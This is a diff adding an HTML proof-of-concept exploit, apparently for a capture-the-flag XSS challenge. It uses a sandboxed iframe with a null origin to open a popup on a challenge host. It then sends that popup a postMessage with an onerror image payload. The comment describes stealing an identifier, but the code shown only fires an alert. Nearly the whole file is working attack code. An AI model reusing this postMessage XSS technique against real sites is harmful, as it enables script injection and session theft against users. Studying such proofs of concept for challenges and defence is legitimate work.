@@ -1,0 +1,35 @@
+<!-- 
+The attack involves a multi-step process to:
+
+1. Create a sandboxed iframe with a 'null' origin.
+2. Open a popup from the iframe, inheriting the 'null' origin.
+3. Send a cross-origin postMessage to the popup to inject XSS and steal the identifier.
+4. Use the stolen identifier to exploit the target page.
+
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Same Origin XSS Exploit</title>
+</head>
+<body>
+    <iframe id="test" sandbox="allow-scripts allow-popups allow-modals" frameborder="0"></iframe>
+    <script>
+        const frame = document.getElementById("test");
+        frame.srcdoc = `
+            <h1>Click me!</h1>
+            <script>
+                onclick = (e) => {
+                    let w = open("https://so-xss.terjanq.me/iframe.php");
+                    setTimeout(() => {
+                        w.postMessage({type: "render" ,body: "<img/src/onerror=alert(1337)>"}, '*');
+                    }, 1000);
+                };
+            <\/script>
+        `;
+    </script>
+</body>
+</html>
